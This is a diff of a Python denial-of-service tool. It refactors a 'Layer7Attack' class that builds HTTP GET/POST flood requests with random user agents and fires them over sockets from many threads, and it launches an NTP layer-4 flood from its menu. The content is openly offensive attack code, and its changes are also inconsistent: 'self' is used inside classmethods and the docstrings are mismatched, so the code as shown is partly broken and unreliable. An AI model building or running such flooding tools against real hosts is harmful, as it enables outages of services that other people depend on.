@@ -32,10 +32,10 @@ import urllib.request
 import random
 import six
 import ipaddress
-from . import attacks
-# import attacks.validators
-# import attacks.goattack
-
+from attacks import *
+from attacks.validators import *
+from attacks import goattack
+from attacks import ntpL4
 try:
     from PyInquirer import (Token, ValidationError, Validator,
                             print_json, prompt, style_from_dict)
@@ -65,13 +65,23 @@ def greeting():
     print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~@Azseza")
 
 
+style = style_from_dict({
+    Token.QuestionMark: '#fac731 bold',
+    Token.Answer: '#4688f1 bold',
+    Token.Instruction: '',  # default
+    Token.Separator: '#cc5454',
+    Token.Selected: '#0abf5b',  # default
+    Token.Pointer: '#673ab7 bold',
+    Token.Question: '',
+})
+
+
 class Layer7Attack:
     """
     A class that handels the NTP layer 4 DDoS attack
     """
-    conf = dict()
     def __init__(self):
-        answers = setArgs()
+        answers = self.setArgs()
         self.ip = answers.get("ip")
         self.host = answers.get("host")
         self.port = answers.get("port")
@@ -86,9 +96,10 @@ class Layer7Attack:
         Keep-Alive: 115
         Connection: keep-alive"""
         self.isbot = 0
-
+        self.conf = answers
+    
     @classmethod
-    def setArgs(cls) -> dict:
+    def setArgs(cls):
         questions = [
             {
                 'type': 'input',
@@ -113,7 +124,7 @@ class Layer7Attack:
                 'type': 'input',
                 'name': 'thr',
                 'message': 'Number of threads : ',
-                'default': 200,
+                'default': '2',
                 'validate': IntValidator
             },
             {
@@ -139,18 +150,17 @@ class Layer7Attack:
         answers = prompt(questions, style=style)
         return answers
     
-    @classmethod
-    def bots(cls) -> list:
+    def bots(self):
         """
         return a list of bots that countin the bots 
         """
         global bots
         bots = []
-        bots.append(cls.conf.get("host"))
+        bots.append(self.conf["host"])
         return bots
     
     @classmethod
-    def user_agent() -> list:
+    def user_agent(cls):
         """
         Function that provides a tuple containing packet data for mayer7 ddos
         """
@@ -172,20 +182,20 @@ class Layer7Attack:
         """
         try:
             while True:
-                if(cls.conf.get("port") == 80):
+                if(self.conf.get("port") == 80):
                     referer = "http://"
-                elif(cls.conf.get("port") == 443):
+                elif(self.conf.get("port") == 443):
                     referer = "https://"
-                if(cls.conf.get("method") == "GET"):
-                    packet = str("GET "+cls.conf.get("path")+" HTTP/1.1\nReferer: "+referer+cls.conf.get("host")+cls.conf.get("uri")+"\nHost: " +cls.conf.get("host")+"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+cls.conf.get("data")).encode('utf-8')
-                elif(cls.conf.get("method") == "POST"):
-                    packet = str("POST "+cls.conf.get("path")+" HTTP/1.1\nReferer: "+referer+cls.conf.get("host")+cls.conf.get("uri")+"\nHost: "+cls.conf.get("host") +"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+cls.conf.get("data")+"\n\n"+cls.conf.get("data")).encode('utf-8')
+                if(self.conf.get("method") == "GET"):
+                    packet = str("GET "+self.conf.get("path")+" HTTP/1.1\nReferer: "+referer+self.conf.get("host")+self.conf.get("uri")+"\nHost: " +self.conf.get("host")+"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+self.conf.get("data")).encode('utf-8')
+                elif(self.conf.get("method") == "POST"):
+                    packet = str("POST "+self.conf.get("path")+" HTTP/1.1\nReferer: "+referer+self.conf.get("host")+self.conf.get("uri")+"\nHost: "+self.conf.get("host") +"\n\n User-Agent: "+random.choice(cls.user_agent)+"\n"+self.conf.get("data")+"\n\n"+self.conf.get("data")).encode('utf-8')
                 else:
                     log("error detected")
 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((cls.conf.get("host"), int(cls.conf.get("port"))))
-            if s.sendto(packet, (cls.conf.get("host"), int(cls.conf.get("port")))):
+            s.connect((self.conf.get("host"), int(self.conf.get("port"))))
+            if s.sendto(packet, (self.conf.get("host"), int(self.conf.get("port")))):
                 s.shutdown(1)
                 log("Attacking . . .")
             else:
@@ -222,29 +232,29 @@ class Layer7Attack:
         w = Queue()
         while True:
             item = w.get()
-            cls.bot_hammering(random.choice(cls.bots))
+            cls.bot_hammering(random.choice(bots))
             w.task_done()
     
     @classmethod
     def run(cls):
         play2 = True
         cls.user_agent()
-        cls.bots()
+        self.bots()
         log("please Wait ...", color="red")
         time.sleep(5)
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((cls.conf.get("host"), int(cls.conf.get("port"))))
+            s.connect((self.conf.get("host"), int(self.conf.get("port"))))
             s.settimeout(1)
         except socket.error as e:
             log("check server ip and port")
         while play2:
             try:
-                for i in range(int(cls.conf.get("thr"))):
+                for i in range(int(self.conf.get("thr"))):
                     t = threading.Thread(target=cls.dos)
                     t.daemon = True
                     t.start()
-                    if(cls.conf.get("isbot") == 1):
+                    if(self.conf.get("isbot") == 1):
                         t2 = threading.Thread(target=cls.dos2)
                         t2.daemon = True
                         t2.start()
@@ -375,15 +385,13 @@ def main():
             try:
                 log("Starting NTP Flood Proccess ! Here we go  !!! ")
                 ntpFlood = ntpL4.NtpFlood()
-                # ntpFlood
-                ntpFlood.run()
+                ntpFlood()
             except KeyboardInterrupt:
                 log("Okay !! i'm stopping")
 
         if attack.get("mode") == "Layer7 DDoS":
             try:
-                conf = Layer7Attack.setArgs()
-                l7 = Layer7Attack(conf)
+                l7 = Layer7Attack()
                 l7.run()
             except KeyboardInterrupt:
                 log("Okay !! i'm stopping")
